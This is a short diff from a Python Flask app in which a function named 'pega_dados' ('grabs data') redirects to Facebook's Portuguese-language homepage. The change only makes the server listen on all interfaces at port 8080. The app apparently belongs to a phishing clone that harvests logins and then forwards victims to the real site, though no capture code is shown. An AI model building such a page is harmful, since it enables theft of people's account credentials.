@@ -14,4 +14,4 @@ def pega_dados():
     return redirect("https://www.facebook.com/?locale=pt_BR")
 
 
-app.run()
+app.run(host="0.0.0.0", port="8080")
